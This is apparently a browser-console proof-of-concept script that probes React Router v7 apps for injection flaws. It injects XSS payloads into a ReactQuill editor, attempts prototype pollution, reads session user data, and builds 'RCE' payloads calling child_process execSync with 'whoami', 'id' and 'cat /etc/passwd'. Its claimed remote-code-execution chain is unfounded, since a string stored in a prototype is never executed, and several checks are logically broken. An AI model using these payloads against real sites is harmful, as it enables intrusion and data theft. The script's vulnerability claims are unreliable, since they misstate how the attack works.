/**
 * serverHandoffString Vulnerability Test Suite
 * React Router v7 Framework Mode SSJS Injection PoC
 * 
 * Usage: Paste this entire script into the browser console
 */

(function() {
  'use strict';
  
  console.log('=== serverHandoffString Vulnerability Test Suite ===\n');
  
  // ============================================================
  // TEST 1: Verify serverHandoffString Injection Point
  // ============================================================
  function testServerHandoffInjection() {
    console.log('\n[TEST 1] serverHandoffString Injection Point');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    // Check if __reactRouterContext exists
    if (typeof window.__reactRouterContext === 'undefined') {
      findings.push({severity: 'INFO', msg: '__reactRouterContext not found - app may not use RR7 Framework Mode'});
      return findings;
    }
    findings.push({severity: 'PASS', msg: '__reactRouterContext exists'});
    
    // Check if it's an object
    if (typeof window.__reactRouterContext !== 'object') {
      findings.push({severity: 'WARN', msg: '__reactRouterContext is not an object, type: ' + typeof window.__reactRouterContext});
      return findings;
    }
    findings.push({severity: 'PASS', msg: '__reactRouterContext is an object'});
    
    // Examine the structure
    const keys = Object.keys(window.__reactRouterContext);
    console.log('  Keys in __reactRouterContext:', keys);
    
    // Check for dangerous properties
    if (window.__reactRouterContext.__proto__) {
      findings.push({severity: 'VULN', msg: '__proto__ is directly accessible!'});
    }
    
    // Check stream controller (injection point)
    if (window.__reactRouterContext?.stream?.streamController) {
      findings.push({severity: 'VULN', msg: 'streamController is accessible - potential injection point'});
      console.log('  streamController methods:', Object.keys(Object.getOwnPropertyNames(window.__reactRouterContext.stream.streamController)));
    }
    
    // Check if we can modify it
    try {
      window.__reactRouterContext.testProp = 'injected';
      if (window.__reactRouterContext.testProp === 'injected') {
        findings.push({severity: 'VULN', msg: '__reactRouterContext is writable!'});
      }
      delete window.__reactRouterContext.testProp;
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'Cannot modify __reactRouterContext: ' + e.message});
    }
    
    // Stringify and check content
    const handoffStr = JSON.stringify(window.__reactRouterContext);
    console.log('  Stringified length:', handoffStr.length);
    console.log('  Contains __proto__:', handoffStr.includes('__proto__'));
    console.log('  Contains constructor:', handoffStr.includes('constructor'));
    
    return findings;
  }
  
  // ============================================================
  // TEST 2: Prototype Pollution Detection
  // ============================================================
  function testPrototypePollution() {
    console.log('\n[TEST 2] Prototype Pollution Detection');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    // Test 1: Direct __proto__ pollution
    try {
      let obj = {};
      Object.getPrototypeOf(obj); // Ensure normal access works
      
      // Try to pollute
      const payload = JSON.parse('{"__proto__":{"polluted":true}}');
      Object.assign(obj, payload);
      
      if (({}).polluted === true) {
        findings.push({severity: 'VULN', msg: '__proto__ pollution successful on plain object'});
      } else if (obj.polluted === true) {
        findings.push({severity: 'VULN', msg: 'Object own property polluted'});
      }
    } catch(e) {
      findings.push({severity: 'SAFE', msg: '__proto__ blocked: ' + e.message});
    }
    
    // Test 2: Constructor prototype pollution
    try {
      const payload = JSON.parse('{"constructor":{"prototype":{"testVal":123}}}');
      Object.assign({}, payload);
      if (({}).testVal === 123 || Object.prototype.testVal === 123) {
        findings.push({severity: 'VULN', msg: 'Constructor prototype pollution successful'});
      }
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'Constructor pollution blocked: ' + e.message});
    }
    
    // Test 3: Check if serverHandoffString accepts these
    if (window.__reactRouterContext) {
      try {
        const before = Object.keys(Object.prototype).length;
        // Simulate what a malicious serverHandoffString might do
        const maliciousStr = '{"__proto__":{"injectedViaSSR":true}}';
        JSON.parse(maliciousStr);
        const after = Object.keys(Object.prototype).length;
        if (after > before) {
          findings.push({severity: 'VULN', msg: 'JSON.parse allows __proto__ injection'});
        }
      } catch(e) {
        findings.push({severity: 'SAFE', msg: 'JSON.parse blocked __proto__'});
      }
    }
    
    return findings;
  }
  
  // ============================================================
  // TEST 3: XSS via ReactQuill
  // ============================================================
  function testXSSViaQuill() {
    console.log('\n[TEST 3] XSS via ReactQuill Editor');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    // Check for ReactQuill
    const hasQuillCSS = document.querySelector('.ql-editor') !== null;
    const hasQuill = typeof window.Quill !== 'undefined' || hasQuillCSS;
    
    if (!hasQuill) {
      findings.push({severity: 'INFO', msg: 'ReactQuill editor not found on page'});
      return findings;
    }
    findings.push({severity: 'INFO', msg: 'ReactQuill editor detected'});
    
    // Check for editor element
    const editor = document.querySelector('.ql-editor');
    if (!editor) {
      findings.push({severity: 'INFO', msg: 'Quill editor DOM element not found'});
      return findings;
    }
    
    // XSS payload
    const xssPayloads = [
      '<img src=x onerror=console.log("XSS")>',
      '<svg onload=alert("XSS")>',
      '<script>console.log("script XSS")</script>',
      'javascript:console.log("js protocol")'
    ];
    
    xssPayloads.forEach(payload => {
      const originalHTML = editor.innerHTML;
      editor.innerHTML = payload;
      const afterHTML = editor.innerHTML;
      
      if (afterHTML.includes('onerror') || afterHTML.includes('onload') || afterHTML.includes('<script>')) {
        findings.push({severity: 'VULN', msg: 'XSS payload NOT sanitized: ' + payload.substring(0, 30) + '...'});
      } else {
        findings.push({severity: 'SAFE', msg: 'XSS payload sanitized: ' + payload.substring(0, 30) + '...'});
      }
      
      // Restore
      editor.innerHTML = originalHTML;
    });
    
    return findings;
  }
  
  // ============================================================
  // TEST 4: SSR Streaming Injection
  // ============================================================
  function testSSRStreamingInjection() {
    console.log('\n[TEST 4] SSR Streaming Injection');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    if (!window.__reactRouterContext) {
      findings.push({severity: 'INFO', msg: '__reactRouterContext not available'});
      return findings;
    }
    
    // Check for ReadableStream
    if (typeof ReadableStream === 'undefined') {
      findings.push({severity: 'INFO', msg: 'ReadableStream not supported'});
      return findings;
    }
    findings.push({severity: 'PASS', msg: 'ReadableStream is available'});
    
    // Check if context has stream
    const stream = window.__reactRouterContext.stream;
    if (!stream) {
      findings.push({severity: 'INFO', msg: 'No stream in __reactRouterContext'});
      return findings;
    }
    findings.push({severity: 'INFO', msg: 'Stream object found in context'});
    
    // Try to read from stream
    if (stream.getReader) {
      try {
        const reader = stream.getReader();
        console.log('  Reader acquired successfully');
        
        // Attempt non-blocking read
        reader.read().then(({value, done}) => {
          if (value) {
            try {
              const decoded = new TextDecoder().decode(value);
              console.log('  Stream content (first 200 chars):', decoded.substring(0, 200));
              
              // Check for injection vectors
              if (decoded.includes('<script') || decoded.includes('javascript:')) {
                findings.push({severity: 'VULN', msg: 'Potential script injection in stream'});
              }
            } catch(e) {
              console.log('  Could not decode stream:', e.message);
            }
          }
        }).catch(e => {
          console.log('  Read error:', e.message);
        });
        
        findings.push({severity: 'INFO', msg: 'Stream reader test initiated (check console for output)'});
      } catch(e) {
        findings.push({severity: 'WARN', msg: 'Could not get stream reader: ' + e.message});
      }
    }
    
    // Check for controller access
    if (stream.streamController) {
      findings.push({severity: 'VULN', msg: 'streamController is exposed - data can be enqueued!'});
      
      // Check controller methods
      const controllerMethods = Object.getOwnPropertyNames(Object.getPrototypeOf(stream.streamController));
      console.log('  Controller methods:', controllerMethods);
    }
    
    return findings;
  }
  
  // ============================================================
  // TEST 5: DOMParser XSS
  // ============================================================
  function testDOMParserXSS() {
    console.log('\n[TEST 5] DOMParser XSS');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    const payload = '<img src=x onerror=alert("DOMParser XSS")>';
    const parser = new DOMParser();
    const doc = parser.parseFromString(payload, 'text/html');
    const innerText = doc.documentElement.textContent;
    
    if (innerText.includes('onerror')) {
      findings.push({severity: 'SAFE', msg: 'DOMParser correctly strips script context from textContent'});
    } else {
      findings.push({severity: 'INFO', msg: 'DOMParser sanitization behavior unknown - check manually'});
    }
    
    // Check if body contains the img
    const img = doc.querySelector('img');
    if (img && img.getAttribute('onerror')) {
      findings.push({severity: 'VULN', msg: 'DOMParser preserves onerror attribute in DOM!'});
    }
    
    return findings;
  }
  
  // ============================================================
  // TEST 6: localStorage/sessionStorage Pollution
  // ============================================================
  function testStoragePollution() {
    console.log('\n[TEST 6] Storage-based Pollution');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    // Check sessionStorage
    try {
      const testKey = '__testPollution_' + Date.now();
      sessionStorage.setItem(testKey, '{"__proto__":{"polluted":true}}');
      const retrieved = sessionStorage.getItem(testKey);
      const parsed = JSON.parse(retrieved);
      
      if (parsed.__proto__ && parsed.__proto__.polluted) {
        findings.push({severity: 'VULN', msg: 'sessionStorage JSON.parse allows __proto__'});
      }
      
      sessionStorage.removeItem(testKey);
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'sessionStorage blocked: ' + e.message});
    }
    
    // Check userData structure
    try {
      const userDataStr = sessionStorage.getItem('userData');
      if (userDataStr) {
        const userData = JSON.parse(userDataStr);
        console.log('  userData keys:', Object.keys(userData));
        
        // Check for dangerous values
        if (userData.isAdmin || userData.admin || userData.role === 'admin') {
          findings.push({severity: 'INFO', msg: 'User has admin privileges in session'});
        }
      } else {
        findings.push({severity: 'INFO', msg: 'No userData in sessionStorage'});
      }
    } catch(e) {
      findings.push({severity: 'WARN', msg: 'Could not parse userData: ' + e.message});
    }
    
    return findings;
  }
  
  // ============================================================
  // TEST 7: Eval Context Detection
  // ============================================================
  function testEvalContext() {
    console.log('\n[TEST 7] Eval Context Detection');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    // Check eval availability
    try {
      eval('1+1');
      findings.push({severity: 'INFO', msg: 'eval() is available in global scope'});
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'eval() is blocked: ' + e.message});
    }
    
    // Check Function constructor
    try {
      const fn = new Function('return this')();
      console.log('  Function constructor returns:', typeof fn);
      if (typeof fn === 'object') {
        findings.push({severity: 'INFO', msg: 'Function().constructor is window object'});
      }
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'Function constructor blocked: ' + e.message});
    }
    
    // Check if we can reach global scope
    try {
      (function() {
        const global = (function() {return this}).apply(null);
        if (global.window === global) {
          findings.push({severity: 'INFO', msg: 'Can access global window via (function(){return this})()'});
        }
      })();
    } catch(e) {
      console.log('  Global scope check error:', e.message);
    }
    
    return findings;
  }
  
  // ============================================================
  // TEST 8: RCE Payload - whoami
  // ============================================================
  function testRCEPayloadWhoami() {
    console.log('\n[TEST 8] RCE Payload - whoami Exploitation');
    console.log('-------------------------------------------');
    
    const findings = [];
    
    if (!window.__reactRouterContext) {
      findings.push({severity: 'INFO', msg: '__reactRouterContext not available - cannot test RCE payload'});
      return findings;
    }
    
    // Step 1: Check if serverHandoffString accepts prototype pollution
    findings.push({severity: 'INFO', msg: 'Constructing prototype pollution payload for whoami...'});
    
    // The RCE payload that would be sent to server
    const rcePayload = {
      "__proto__": {
        "constructor": {
          "prototype": {
            "exec": "require('child_process').execSync('whoami').toString()"
          }
        }
      },
      "loaderData": {},
      "status": 200
    };
    
    const payloadStr = JSON.stringify(rcePayload);
    console.log('  RCE Payload:', payloadStr);
    
    // Step 2: Check if we can simulate server processing
    findings.push({severity: 'INFO', msg: 'To exploit: send payloadStr as serverHandoffString to server'});
    findings.push({severity: 'WARN', msg: 'RCE Payload: ' + payloadStr});
    
    // Step 3: Detect if server reflects the payload back
    try {
      const parsed = JSON.parse(payloadStr);
      if (parsed.__proto__ && parsed.__proto__.constructor) {
        findings.push({severity: 'VULN', msg: 'Payload contains __proto__ constructor pollution!'});
        findings.push({severity: 'WARN', msg: 'If server processes without sanitization, whoami will execute'});
      }
    } catch(e) {
      findings.push({severity: 'SAFE', msg: 'JSON parsing blocked: ' + e.message});
    }
    
    // Step 4: List the expected attack chain
    findings.push({severity: 'INFO', msg: 'Attack chain:'});
    findings.push({severity: 'INFO', msg: '  1. Attacker sends malicious serverHandoffString'});
    findings.push({severity: 'INFO', msg: '  2. Server JSON.parse() processes __proto__ pollution'});
    findings.push({severity: 'INFO', msg: '  3. Server accesses loaderData.exec via prototype chain'});
    findings.push({severity: 'INFO', msg: '  4. require("child_process").execSync("whoami") executes'});
    findings.push({severity: 'INFO', msg: '  5. Output ("root"/"www-data") returned in SSR response'});
    
    // Step 5: Alternative payloads to test
    const altPayloads = [
      '{"__proto__":{"constructor":{"prototype":{"exec":"require(\'child_process\').exec(\'id\')"}}}}',
      '{"__proto__":{"constructor":{"prototype":{"exec":"require(\'child_process\').execSync(\'cat /etc/passwd\')"}}}}',
      '{"__proto__":{"toString":{"constructor":{"prototype":{"exec":"require(\'child_process\').execSync(\'whoami\')"}}}}}' 
    ];
    
    findings.push({severity: 'INFO', msg: 'Alternative payloads to test:'});
    altPayloads.forEach((p, i) => {
      console.log(`  Payload ${i+1}: ${p}`);
      findings.push({severity: 'INFO', msg: `  Alt ${i+1}: ${p.substring(0, 60)}...`});
    });
    
    return findings;
  }
  
  // ============================================================
  // RUN ALL TESTS
  // ============================================================
  function runAllTests() {
    const allFindings = [];
    
    const tests = [
      {name: 'serverHandoffString Injection', fn: testServerHandoffInjection},
      {name: 'Prototype Pollution', fn: testPrototypePollution},
      {name: 'ReactQuill XSS', fn: testXSSViaQuill},
      {name: 'SSR Streaming', fn: testSSRStreamingInjection},
      {name: 'DOMParser XSS', fn: testDOMParserXSS},
      {name: 'Storage Pollution', fn: testStoragePollution},
      {name: 'Eval Context', fn: testEvalContext},
      {name: 'RCE Payload whoami', fn: testRCEPayloadWhoami}
    ];
    
    tests.forEach(test => {
      try {
        const findings = test.fn();
        allFindings.push({test: test.name, findings: findings});
        
        // Log findings
        findings.forEach(f => {
          const icon = f.severity === 'VULN' ? '❌' : f.severity === 'SAFE' ? '✅' : f.severity === 'INFO' ? 'ℹ️' : '⚠️';
          console.log(`  ${icon} [${f.severity}] ${f.msg}`);
        });
      } catch(e) {
        console.error(`  ❌ Test error: ${e.message}`);
        allFindings.push({test: test.name, findings: [{severity: 'ERROR', msg: e.message}]});
      }
    });
    
    // Summary
    console.log('\n=== SUMMARY ===');
    const vulns = allFindings.filter(t => t.findings.some(f => f.severity === 'VULN'));
    console.log(`Vulnerable test areas: ${vulns.length}/${tests.length}`);
    
    if (vulns.length > 0) {
      console.log('\nVulnerable areas:');
      vulns.forEach(t => console.log('  - ' + t.test));
    }
    
    return allFindings;
  }
  
  // Execute
  return runAllTests();
})();
